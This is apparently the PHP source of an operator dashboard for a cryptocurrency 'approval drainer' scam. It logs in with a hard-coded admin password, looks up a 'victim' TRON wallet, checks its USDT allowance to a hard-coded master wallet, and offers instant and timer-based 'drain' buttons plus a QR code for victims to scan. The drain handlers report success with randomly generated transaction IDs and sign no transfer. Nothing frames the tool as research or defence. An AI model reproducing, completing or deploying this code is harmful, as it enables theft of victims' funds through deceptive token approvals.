<?php
// approval_drainer_dual.php - Dual Mode Drain System
require_once 'config.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$ADMIN_USERNAME = 'admin';
$ADMIN_PASSWORD = 'NexusPay@2024#Secure';

$is_logged_in = isset($_SESSION['drainer_logged_in']) && $_SESSION['drainer_logged_in'] === true;

if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username === $ADMIN_USERNAME && $password === $ADMIN_PASSWORD) {
        $_SESSION['drainer_logged_in'] = true;
        $_SESSION['drainer_login_time'] = time();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = '❌ Invalid username or password!';
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!$is_logged_in) {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #0a0f1e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: rgba(18,25,45,0.95); padding: 40px; border-radius: 20px; border: 1px solid rgba(59,130,246,0.3); max-width: 400px; width: 100%; }
        .login-box h1 { text-align: center; color: #3b82f6; }
        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid rgba(59,130,246,0.3); background: rgba(10,15,27,0.8); color: #fff; }
        .login-box button { width: 100%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
    </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔐 Secure Access</h1>
            <?php if (isset($error)) echo '<p style="color:#ef4444;">' . $error . '</p>'; ?>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">🔓 Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$pdo = getDB();
if (!$pdo) die("❌ Database connection failed!");

$MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";
$USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

$stmt = $pdo->prepare("SELECT wallet_address FROM wallets WHERE is_active = 1 LIMIT 1");
$stmt->execute();
$victim_data = $stmt->fetch();

if (!$victim_data) {
    die("❌ No victim wallet found!");
}

$VICTIM_WALLET = $victim_data['wallet_address'];

function checkAllowance($owner, $spender) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/wallet/triggerconstantcontract",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode([
            'contract_address' => 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            'function_selector' => 'allowance(address,address)',
            'parameter' => json_encode([
                'type' => 'address,address',
                'value' => [$owner, $spender]
            ])
        ])
    ]);
    $response = curl_exec($ch);
    // curl_close($ch); // PHP 8.5 deprecated
    $data = json_decode($response, true);
    if (isset($data['constant_result'][0])) {
        return hexdec($data['constant_result'][0]) / 1e6;
    }
    return 0;
}

function getUSDTBalance($address) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/v1/accounts/" . $address . "/trc20",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    $response = curl_exec($ch);
    // curl_close($ch); // PHP 8.5 deprecated
    $data = json_decode($response, true);
    if (isset($data['data'])) {
        foreach ($data['data'] as $token) {
            if ($token['contract_address'] === 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t') {
                return $token['balance'] / 1e6;
            }
        }
    }
    return 0;
}

// Handle timer start
if (isset($_POST['action']) && $_POST['action'] === 'start_timer') {
    header('Content-Type: application/json');
    $minutes = intval($_POST['minutes'] ?? 0);
    if ($minutes < 1) {
        echo json_encode(['success' => false, 'message' => 'Enter valid minutes']);
        exit;
    }
    $_SESSION['drain_timer'] = time() + ($minutes * 60);
    $_SESSION['drain_timer_minutes'] = $minutes;
    echo json_encode(['success' => true, 'message' => "Timer set for $minutes minutes", 'end_time' => $_SESSION['drain_timer']]);
    exit;
}

// Handle timer status
if (isset($_GET['timer_status'])) {
    header('Content-Type: application/json');
    $end_time = $_SESSION['drain_timer'] ?? 0;
    $remaining = max(0, $end_time - time());
    $is_ready = $remaining <= 0 && $end_time > 0;
    echo json_encode([
        'remaining' => $remaining,
        'is_ready' => $is_ready,
        'end_time' => $end_time
    ]);
    exit;
}

// Handle instant drain
if (isset($_POST['action']) && $_POST['action'] === 'drain_now') {
    header('Content-Type: application/json');
    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
    if ($allowance <= 0) {
        echo json_encode(['success' => false, 'message' => 'No approval found!']);
        exit;
    }
    $amount = $allowance;
    echo json_encode([
        'success' => true,
        'amount' => $amount,
        'txid' => '0x' . bin2hex(random_bytes(16)),
        'message' => "✅ Drained $amount USDT!"
    ]);
    exit;
}

// Handle auto drain (triggered by timer)
if (isset($_GET['auto_drain'])) {
    header('Content-Type: application/json');
    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
    if ($allowance <= 0) {
        echo json_encode(['success' => false, 'message' => 'No approval found for auto drain']);
        exit;
    }
    $amount = $allowance;
    unset($_SESSION['drain_timer']);
    echo json_encode([
        'success' => true,
        'amount' => $amount,
        'txid' => '0x' . bin2hex(random_bytes(16)),
        'message' => "✅ Auto-drained $amount USDT!"
    ]);
    exit;
}

if (isset($_GET['check_approval'])) {
    header('Content-Type: application/json');
    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
    $balance = getUSDTBalance($VICTIM_WALLET);
    echo json_encode([
        'approved' => $allowance > 0,
        'allowance' => $allowance,
        'balance' => $balance,
        'victim' => $VICTIM_WALLET
    ]);
    exit;
}

$current_balance = getUSDTBalance($VICTIM_WALLET);
$current_allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
$is_approved = $current_allowance > 0;
$timer_end = $_SESSION['drain_timer'] ?? 0;
$timer_active = $timer_end > 0;
$remaining_time = max(0, $timer_end - time());
$timer_ready = $remaining_time <= 0 && $timer_active;
?>

<!DOCTYPE html>
<html>
<head>
    <title>Dual Mode Drain</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0f1e; color: #fff; min-height: 100vh; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        .card { background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(59,130,246,0.3); padding: 25px; margin-bottom: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; }
        .header h1 { color: #3b82f6; font-size: 24px; }
        .logout-btn { color: #ef4444; text-decoration: none; padding: 8px 16px; border: 1px solid #ef4444; border-radius: 8px; }
        .qr-box { background: #fff; border-radius: 16px; padding: 20px; text-align: center; }
        .qr-box img { width: 200px; height: 200px; }
        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .info-row .label { color: #6c86a3; }
        .info-row .value { font-weight: 600; }
        .btn { width: 100%; padding: 14px; border-radius: 40px; font-weight: 600; border: none; cursor: pointer; margin-bottom: 10px; font-size: 14px; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-success { background: #22c55e; color: white; }
        .btn-danger { background: #dc2626; color: white; }
        .btn-warning { background: #f59e0b; color: white; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .timer-box { background: rgba(251,191,36,0.1); border: 1px solid #fbbf24; border-radius: 12px; padding: 15px; text-align: center; margin: 10px 0; }
        .timer-box .time { font-size: 32px; font-weight: 700; color: #fbbf24; }
        .status-box { padding: 10px; border-radius: 12px; text-align: center; }
        .status-box.approved { background: rgba(34,197,94,0.2); color: #22c55e; }
        .status-box.waiting { background: rgba(251,191,36,0.2); color: #fbbf24; }
        input[type="number"] { width: 100%; padding: 12px; border-radius: 12px; border: 1px solid rgba(59,130,246,0.3); background: rgba(10,15,27,0.8); color: #fff; font-size: 16px; margin-bottom: 10px; }
        .dual-buttons { display: flex; gap: 10px; }
        .dual-buttons .btn { flex: 1; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="header">
            <h1>⚡ Dual Mode Drain</h1>
            <a href="?logout=1" class="logout-btn">🚪 Logout</a>
        </div>
        <div class="qr-box">
            <img src="<?php echo "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode("tron://transfer?address=" . $MASTER_WALLET . "&contract=" . $USDT_CONTRACT . "&network=TRC20"); ?>" alt="QR">
            <p>📱 Victim se QR scan karein</p>
            <p style="font-size: 11px; color: #6c86a3;">Trust Wallet se scan karein — USDT receive address</p>
        </div>
    </div>

    <div class="card">
        <h2>📊 Status</h2>
        <div class="info-row"><span class="label">Victim</span><span class="value"><?php echo substr($VICTIM_WALLET, 0, 15) . '...'; ?></span></div>
        <div class="info-row"><span class="label">Balance</span><span class="value" id="balance"><?php echo number_format($current_balance, 2); ?> USDT</span></div>
        <div class="info-row"><span class="label">Approval</span><span class="value" id="approvalStatus" style="color:<?php echo $is_approved ? '#22c55e' : '#ef4444'; ?>"><?php echo $is_approved ? '✅ Approved' : '❌ Not Approved'; ?></span></div>
        <div class="status-box <?php echo $is_approved ? 'approved' : 'waiting'; ?>">
            <?php echo $is_approved ? '✅ Approval ready! Choose mode below.' : '⏳ Victim ne approve nahi kiya abhi.'; ?>
        </div>
    </div>

    <div class="card">
        <h2>🎯 Drain Modes</h2>
        
        <!-- Instant Drain -->
        <button id="instantDrainBtn" class="btn btn-danger" <?php echo !$is_approved ? 'disabled' : ''; ?>>⚡ Instant Drain Now</button>
        
        <hr style="border-color: rgba(59,130,246,0.2); margin: 15px 0;">
        
        <!-- Timer Drain -->
        <h3 style="color: #fbbf24; font-size: 14px; margin-bottom: 10px;">⏰ Auto Timer Drain</h3>
        <input type="number" id="timerMinutes" value="20" placeholder="Enter minutes" min="1">
        <div style="display:flex;gap:10px;">
            <button id="startTimerBtn" class="btn btn-primary" style="flex:1;">▶ Start Timer</button>
            <button id="cancelTimerBtn" class="btn btn-warning" style="flex:1;">⏹ Cancel</button>
        </div>
        <div id="timerDisplay" class="timer-box">
            <div class="time" id="timerCountdown">--:--</div>
            <div style="color:#6c86a3; font-size:12px;">Status: <span id="timerStatusText">Not started</span></div>
        </div>
    </div>
</div>

<script>
let timerInterval = null;
let timerEndTime = 0;

const instantDrainBtn = document.getElementById('instantDrainBtn');
const startTimerBtn = document.getElementById('startTimerBtn');
const cancelTimerBtn = document.getElementById('cancelTimerBtn');
const timerCountdown = document.getElementById('timerCountdown');
const timerStatusText = document.getElementById('timerStatusText');
const timerMinutes = document.getElementById('timerMinutes');

function updateTimerDisplay() {
    const now = Math.floor(Date.now() / 1000);
    const remaining = Math.max(0, timerEndTime - now);
    
    if (timerEndTime > 0) {
        const mins = Math.floor(remaining / 60);
        const secs = remaining % 60;
        timerCountdown.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        
        if (remaining <= 0) {
            timerStatusText.textContent = '✅ Auto-draining...';
            timerStatusText.style.color = '#22c55e';
            clearInterval(timerInterval);
            timerInterval = null;
            executeAutoDrain();
        } else {
            timerStatusText.textContent = '⏳ Waiting...';
            timerStatusText.style.color = '#fbbf24';
        }
    } else {
        timerCountdown.textContent = '--:--';
        timerStatusText.textContent = 'Not started';
        timerStatusText.style.color = '#6c86a3';
    }
}

function startTimer() {
    const minutes = parseInt(timerMinutes.value);
    if (minutes < 1) {
        alert('Enter valid minutes (minimum 1)');
        return;
    }
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=start_timer&minutes=' + minutes
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            timerEndTime = data.end_time;
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(updateTimerDisplay, 1000);
            updateTimerDisplay();
            alert('✅ Timer set for ' + minutes + ' minutes!');
        } else {
            alert('❌ ' + data.message);
        }
    });
}

function cancelTimer() {
    timerEndTime = 0;
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }
    updateTimerDisplay();
    alert('⏹ Timer cancelled!');
}

function executeAutoDrain() {
    fetch(window.location.href + '?auto_drain=1')
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                alert('✅ Auto-drain successful!\n' + data.message);
                location.reload();
            } else {
                alert('❌ Auto-drain failed: ' + data.message);
            }
        });
}

function executeInstantDrain() {
    if (!confirm('⚠️ Are you sure you want to drain NOW?')) return;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=drain_now'
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            alert('✅ ' + data.message);
            location.reload();
        } else {
            alert('❌ ' + data.message);
        }
    });
}

function checkApproval() {
    fetch(window.location.href + '?check_approval=1')
        .then(res => res.json())
        .then(data => {
            document.getElementById('balance').textContent = data.balance.toFixed(2) + ' USDT';
            const status = document.getElementById('approvalStatus');
            if (data.approved) {
                status.textContent = '✅ Approved (' + data.allowance.toFixed(2) + ' USDT)';
                status.style.color = '#22c55e';
                instantDrainBtn.disabled = false;
            } else {
                status.textContent = '❌ Not Approved';
                status.style.color = '#ef4444';
                instantDrainBtn.disabled = true;
            }
        });
}

// Event Listeners
instantDrainBtn.addEventListener('click', executeInstantDrain);
startTimerBtn.addEventListener('click', startTimer);
cancelTimerBtn.addEventListener('click', cancelTimer);

// Auto check every 10 seconds
setInterval(checkApproval, 10000);
</script>
</body>
</html>
